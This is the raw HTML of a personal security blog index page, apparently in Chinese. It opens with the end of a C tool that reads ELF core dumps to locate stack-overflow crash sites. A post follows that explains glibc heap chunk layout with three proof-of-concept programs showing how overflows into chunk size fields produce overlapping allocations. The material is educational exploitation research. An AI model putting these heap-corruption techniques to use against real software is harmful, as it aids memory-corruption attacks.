class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">ReadElfHeader</span><span class="params">(FILE *fp, Elf32_Ehdr *elfhdr, <span class="keyword">void</span> *fphdr)</span></span></div><div class="line">&#123;</div><div class="line">    fphdr = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Elf32_Ehdr));</div><div class="line">    fread(fphdr, <span class="keyword">sizeof</span>(Elf32_Ehdr),<span class="number">1</span>, fp);</div><div class="line">    </div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i ++ )</div><div class="line">        elfhdr-&gt;e_ident[i] = ((Elf32_Ehdr*)fphdr)-&gt;e_ident[i];</div><div class="line">    </div><div class="line">    elfhdr-&gt;e_ident[<span class="number">6</span>] = ((Elf32_Ehdr*)fphdr)-&gt;e_ident[<span class="number">6</span>];</div><div class="line">    elfhdr-&gt;e_type = ((Elf32_Ehdr*)fphdr)-&gt;e_type;</div><div class="line">    elfhdr-&gt;e_machine = ((Elf32_Ehdr*)fphdr)-&gt;e_machine;</div><div class="line">    elfhdr-&gt;e_entry = ((Elf32_Ehdr*)fphdr)-&gt;e_entry;</div><div class="line">    elfhdr-&gt;e_phoff = ((Elf32_Ehdr*)fphdr)-&gt;e_phoff;</div><div class="line">    elfhdr-&gt;e_shoff = ((Elf32_Ehdr*)fphdr)-&gt;e_shoff;</div><div class="line">    elfhdr-&gt;e_phentsize = ((Elf32_Ehdr*)fphdr)-&gt;e_phentsize;</div><div class="line">    elfhdr-&gt;e_phnum = ((Elf32_Ehdr*)fphdr)-&gt;e_phnum;</div><div class="line">    elfhdr-&gt;e_shentsize = ((Elf32_Ehdr*)fphdr)-&gt;e_shentsize; </div><div class="line">    elfhdr-&gt;e_shnum = ((Elf32_Ehdr*)fphdr)-&gt;e_shnum;</div><div class="line">    elfhdr-&gt;e_shstrndx = ((Elf32_Ehdr*)fphdr)-&gt;e_shstrndx;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    FILE *fp;</div><div class="line">    <span class="keyword">void</span> *fphdr;</div><div class="line">    <span class="keyword">void</span> *shdr;</div><div class="line">    <span class="keyword">void</span> *phdr;</div><div class="line">    <span class="keyword">ssize_t</span> size;</div><div class="line">    Elf32_Ehdr elfhdr;</div><div class="line"></div><div class="line">    fp = fopen(argv[<span class="number">2</span>], <span class="string">"r"</span>);</div><div class="line">    </div><div class="line">    ReadElfHeader(fp, &amp;elfhdr, fphdr);</div><div class="line">    </div><div class="line">    fseek(fp, elfhdr.e_shoff, SEEK_SET);</div><div class="line">    shdr = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Elf32_Shdr)*elfhdr.e_shnum);</div><div class="line">    size = fread(shdr, <span class="keyword">sizeof</span>(Elf32_Shdr),elfhdr.e_shnum, fp);</div><div class="line">    </div><div class="line">    <span class="keyword">char</span> SectionName[<span class="number">128</span>];</div><div class="line">    <span class="comment">//printf("%d\n", elfhdr.e_shnum);</span></div><div class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; elfhdr.e_shnum; i ++ )</div><div class="line">    &#123;</div><div class="line">        j = <span class="number">0</span>;</div><div class="line">        <span class="comment">//printf("%d\n", i);</span></div><div class="line">        <span class="comment">//printf("* [%2d]",i); </span></div><div class="line">        <span class="comment">//memset(SectionName, 0, 128);</span></div><div class="line">        fseek(fp, ((((Elf32_Shdr*)shdr)[elfhdr.e_shstrndx]).sh_offset + (((Elf32_Shdr*)shdr)[i]).sh_name), SEEK_SET);</div><div class="line">        <span class="keyword">do</span></div><div class="line">        &#123;</div><div class="line">            SectionName[j] = getc(fp);        </div><div class="line">        &#125;<span class="keyword">while</span>(<span class="string">'\0'</span> != SectionName[j++]);</div><div class="line">        <span class="comment">//printf("%s\n", SectionName);</span></div><div class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(SectionName, <span class="string">".text"</span>) )</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">int</span> TextRange, TextStart, TextOffset;</div><div class="line">    TextOffset = (((Elf32_Shdr*)shdr)[i]).sh_offset;</div><div class="line">    TextStart = (((Elf32_Shdr*)shdr)[i]).sh_addr;</div><div class="line">    TextRange = (((Elf32_Shdr*)shdr)[i]).sh_size;</div><div class="line">    </div><div class="line">    close(fp);</div><div class="line">    fp = fopen(argv[<span class="number">1</span>], <span class="string">"r"</span>);</div><div class="line">    </div><div class="line">    ReadElfHeader(fp, &amp;elfhdr, fphdr);</div><div class="line">    </div><div class="line">    fseek(fp, elfhdr.e_shoff, SEEK_SET);</div><div class="line">    shdr = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Elf32_Shdr)*elfhdr.e_shnum);</div><div class="line">    size = fread(shdr, <span class="keyword">sizeof</span>(Elf32_Shdr),elfhdr.e_shnum, fp);</div><div class="line">    </div><div class="line">    fseek(fp, elfhdr.e_phoff, SEEK_SET);</div><div class="line">    phdr = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Elf32_Phdr)*elfhdr.e_phnum);</div><div class="line">    size = fread(phdr, <span class="keyword">sizeof</span>(Elf32_Phdr), elfhdr.e_phnum, fp);</div><div class="line"></div><div class="line">    <span class="keyword">int</span> NoteBase, StackBase, VirtStackBase;</div><div class="line">    <span class="keyword">int</span> StackSize;</div><div class="line">    <span class="keyword">int</span> OffsetToNote_ebp = <span class="number">0x70</span>, OffsetToNote_esp = <span class="number">0x98</span>;</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">5</span>];</div><div class="line">    </div><div class="line">    NoteBase = (((Elf32_Phdr*)phdr)[<span class="number">0</span>]).p_offset;</div><div class="line">    StackBase = (((Elf32_Phdr*)phdr)[elfhdr.e_phnum - <span class="number">1</span>]).p_offset;</div><div class="line">    VirtStackBase = (((Elf32_Phdr*)phdr)[elfhdr.e_phnum - <span class="number">1</span>]).p_vaddr;</div><div class="line">    StackSize = (((Elf32_Phdr*)phdr)[elfhdr.e_phnum - <span class="number">1</span>]).p_memsz;</div><div class="line">    </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Note base:       0x%08x\n"</span>, NoteBase);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Stack base:      0x%08x\n"</span>, StackBase);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Stack VirAddr:   0x%08x\n"</span>, VirtStackBase);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Stack size:      0x%08x\n"</span>, StackSize);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Text start:      0x%08x\n"</span>, TextStart);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Text range:      0x%08x\n"</span>, TextRange);</div><div class="line">    </div><div class="line">    fseek(fp, NoteBase + OffsetToNote_ebp, SEEK_SET);</div><div class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">5</span>);</div><div class="line">    fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp);</div><div class="line">    </div><div class="line">    <span class="keyword">int</span> EbpPtr = u32(buf);</div><div class="line">    </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"ebp ptr: 0x%08x\n"</span>, EbpPtr);</div><div class="line"></div><div class="line">    fseek(fp, NoteBase + OffsetToNote_esp, SEEK_SET);</div><div class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">5</span>);</div><div class="line">    fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp);</div><div class="line">    </div><div class="line">    <span class="keyword">int</span> EspPtr = u32(buf);</div><div class="line">    </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"esp ptr: 0x%08x\n"</span>, EspPtr);</div><div class="line">    </div><div class="line">    <span class="keyword">int</span> OffsetToStack_ebp = EbpPtr - VirtStackBase;</div><div class="line">    <span class="keyword">int</span> OffsetToStack_esp = EspPtr - VirtStackBase;</div><div class="line">    </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"ebp ptr offset: 0x%08x\n"</span>, OffsetToStack_ebp);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"esp ptr offset: 0x%08x\n"</span>, OffsetToStack_esp);</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> ( OffsetToStack_ebp &lt; <span class="number">0</span> || OffsetToStack_ebp &gt; StackSize )</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> VulAddr = ForwardTrace(fp, TextStart, TextRange, StackBase, OffsetToStack_esp);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Stack Overflow Detected\n"</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Vul Offset To Binary:    0x%08x\n"</span>, VulAddr + TextOffset);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Vul Address:             0x%08x\n"</span>, VulAddr + TextStart);</div><div class="line">        close(fp);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> VulAddr = BackTrace(fp, TextStart, TextRange, OffsetToStack_ebp + StackBase, StackSize - OffsetToStack_ebp);</div><div class="line">    </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Vul Offset To Binary:    0x%08x\n"</span>, VulAddr + TextOffset);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Vul Address:             0x%08x\n"</span>, VulAddr + TextStart);</div><div class="line">    </div><div class="line">    close(fp);</div><div class="line">    </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/coding/">coding</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/elf-structure/">elf-structure</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-Producing-Overlapping-Chunks" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/10/15/Producing-Overlapping-Chunks/" class="article-date">
  	<time datetime="2016-10-15T08:35:51.000Z" itemprop="datePublished">2016-10-15</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/10/15/Producing-Overlapping-Chunks/">
        Producing Overlapping Chunks
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>source: <a href="http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf" target="_blank" rel="external">Glibc_Adventures-The_Forgotten_Chunks</a></p>
</blockquote>
<h2 id="linux下堆的结构"><a href="#linux下堆的结构" class="headerlink" title="linux下堆的结构"></a>linux下堆的结构</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> </span></div><div class="line">&#123;</div><div class="line">    </div><div class="line">    INTERNAL_SIZE_T prev_size; <span class="comment">/* Size of previous chunk (if free). */</span></div><div class="line">    INTERNAL_SIZE_T size; <span class="comment">/* Size in bytes, including overhead. */</span></div><div class="line">    </div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span> <span class="comment">/* double links -- used only if free. */</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></div><div class="line">    </div><div class="line">    <span class="comment">/* Only used for large blocks: pointer to next larger size. */</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>为了设计简单，硬件访问内存是以机器字长位单位的，所以申请堆块时，<code>malloc</code>函数会调整申请的内存的长度为机器字长的倍数，<br>32位及64位情况下均是8的倍数，这就导致<code>size</code>大小最低3个bit全部为0，<br>本着物尽其用的原则，这三个bit作为堆块的标志位，其中最低位作为<code>pre_chunk</code>是否空闲的标志位，<br>也因为这个原则，特定情况下<code>prev_size</code>部分也会成为前一个堆块的内容，<br>这是各种heap base null byte overflow能被利用的原因，</p>
<h2 id="Extending-Free-Chunks"><a href="#Extending-Free-Chunks" class="headerlink" title="Extending Free Chunks"></a>Extending Free Chunks</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> * A, * B, * C;</div><div class="line">    </div><div class="line">    A = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>); <span class="comment">// This is where the overflow happens</span></div><div class="line">    B = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>); <span class="comment">// Free chunk being extended</span></div><div class="line">    C = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>); <span class="comment">// Chunk being overlapped</span></div><div class="line">    </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"C chunk: %p -&gt; %p\n"</span>, C, C + <span class="number">0x80</span> - <span class="number">8</span>);</div><div class="line">    </div><div class="line">    <span class="built_in">free</span>(B); <span class="comment">// Freeing B</span></div><div class="line">    </div><div class="line">    <span class="comment">/* Overflow into A</span></div><div class="line">    * The old chunk B's size becomes 0x181 instead of 0x101</div><div class="line">    */</div><div class="line">    A[<span class="number">0x100</span> - <span class="number">8</span>] = <span class="number">0x81</span>;</div><div class="line">    </div><div class="line">    B = <span class="built_in">malloc</span>(<span class="number">0x100</span> + <span class="number">0x80</span> - <span class="number">8</span>); <span class="comment">// Allocation of old B size + C size</span></div><div class="line">    </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"New B chunk: %p -&gt; %p\n"</span>, B, B + <span class="number">0x100</span> + <span class="number">0x80</span> - <span class="number">8</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="Producing-Overlapping-Chunks/ExtendingFreeChunk.png" alt="">  </p>
<p>输出如下:</p>
<pre><code>$ ./extend_free_overlap
C chunk: 0x2036210 -&gt; 0x2036288
New B chunk: 0x2036110 -&gt; 0x2036288
</code></pre><p><code>malloc</code>函数从<code>freelist</code>中搜索大小符合要求的堆块，但是只检查了该堆块的<code>size</code>部分，没有检查<code>next_chunk</code>的<code>prev_size</code>  </p>
<h2 id="Extending-Allocated-Chunks"><a href="#Extending-Allocated-Chunks" class="headerlink" title="Extending Allocated Chunks"></a>Extending Allocated Chunks</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> * A, * B, * C;</div><div class="line">    </div><div class="line">    A = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>); <span class="comment">// This is where the overflow happens</span></div><div class="line">    B = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>); <span class="comment">// Free chunk being extended</span></div><div class="line">    C = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>); <span class="comment">// Chunk being overlapped</span></div><div class="line">    </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"C chunk: %p -&gt; %p\n"</span>, C, C + <span class="number">0x80</span> - <span class="number">8</span>);</div><div class="line">    </div><div class="line">    <span class="comment">/* Overflow into A</span></div><div class="line">    * The old chunk B's size becomes 0x181 instead of 0x101</div><div class="line">    */</div><div class="line">    A[<span class="number">0x100</span> - <span class="number">8</span>] = <span class="number">0x81</span>;</div><div class="line">    </div><div class="line">    <span class="built_in">free</span>(B); <span class="comment">// Freeing B</span></div><div class="line">    </div><div class="line">    B = <span class="built_in">malloc</span>(<span class="number">0x100</span> + <span class="number">0x80</span> - <span class="number">8</span>); <span class="comment">// Allocation of old B size + C size</span></div><div class="line">    </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"New B chunk: %p -&gt; %p\n"</span>, B, B + <span class="number">0x100</span> + <span class="number">0x80</span> - <span class="number">8</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="Producing-Overlapping-Chunks/ExtendingAllocatedChunk.png" alt=""><br>输出:</p>
<pre><code>root@kali:/vagrant/Heap/8_byte_test# ./test
C chunk: 0xe25210 -&gt; 0xe25288
New B chunk: 0xe25110 -&gt; 0xe25288
</code></pre><p>为了防止<code>double free</code>，<code>free</code>函数会检查该堆块的<code>next_chunk</code>的<code>pre_inuse</code>标志位，<br>这个例子中，溢出修改B chunk的<code>size</code>为B，C两个chunk大小之和，<br><code>free</code>函数根据<code>B-&gt;size</code>寻找下一个堆块的<code>pre_inuse</code>标志位，已确保B不是空闲状态，<br>但此时寻找到的是C的next_chunk，C不是空闲态，<code>free</code>函数判定合法，将B+C大小的堆块链入<code>freelist</code>，<br>同样的，<code>free</code>函数也不检查堆块的<code>next_chunk</code>的<code>pre_size</code>  </p>
<h2 id="Shrinking-Free-Chunks"><a href="#Shrinking-Free-Chunks" class="headerlink" title="Shrinking Free Chunks"></a>Shrinking Free Chunks</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> *A, *B, *C;</div><div class="line">    <span class="keyword">char</span> *B1, *B2, *B3;</div><div class="line">    A = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</div><div class="line">    B = <span class="built_in">malloc</span>(<span class="number">0x208</span>);</div><div class="line">    C = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</div><div class="line">    </div><div class="line">    <span class="built_in">free</span>(B);</div><div class="line">    </div><div class="line">    A[<span class="number">0x100</span> - <span class="number">8</span>] = <span class="number">0x00</span>;</div><div class="line">    </div><div class="line">    B1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</div><div class="line">    B2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</div><div class="line">    </div><div class="line">    <span class="built_in">free</span>(B1);</div><div class="line">    <span class="built_in">free</span>(C);</div><div class="line">    </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"B2 chunk: %p -&gt; %p\n"</span>, B2, B2 + <span class="number">0x80</span>);</div><div class="line">    </div><div class="line">    B3 = <span class="built_in">malloc</span>(<span class="number">0x180</span>);</div><div class="line">    </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"B3 chunk: %p -&gt; %p\n"</span>, B, B + <span class="number">0x180</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="Producing-Overlapping-Chunks/ShrinkingFreeChunks.png" alt=""><br>程序输出：  </p>
<pre><code>root@kali:/vagrant/Heap/8_byte_test# ./test
B2 chunk: 0x1025220 -&gt; 0x10252a0
B3 chunk: 0x1025110 -&gt; 0x1025290
</code></pre><p><code>free(B)</code>后原先的B堆块被链入<code>freelist</code>，再申请一个大小小于B的B1，malloc函数优先从原先的B中切割一块给B1<br>此时会修改C堆块的<code>prev_size</code>，但是因为此前溢出修改了<code>B-&gt;size</code>，根据被修改过的<code>B-&gt;size</code>找到了错误的C堆块头部(B堆块中)，<br>真正的<code>C-&gt;prev_size</code>并没有被修改，在<code>free(C)</code>时,因为<code>C-&gt;PREV_INUSE</code>为0发生向前合并,根据<code>C-&gt;prev_size</code>找到了原先B堆块(现B1堆块)的头部，<br>此时B1堆块空闲，满足向前合并的条件，所以B和C两个堆块被合并然后链入freelist，此时再申请合适大小的堆块，就可以覆盖到B2，产生堆块重叠</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap/">heap</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2017 DazzleP
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">


<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>
<script src="/js/main.js"></script>



<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>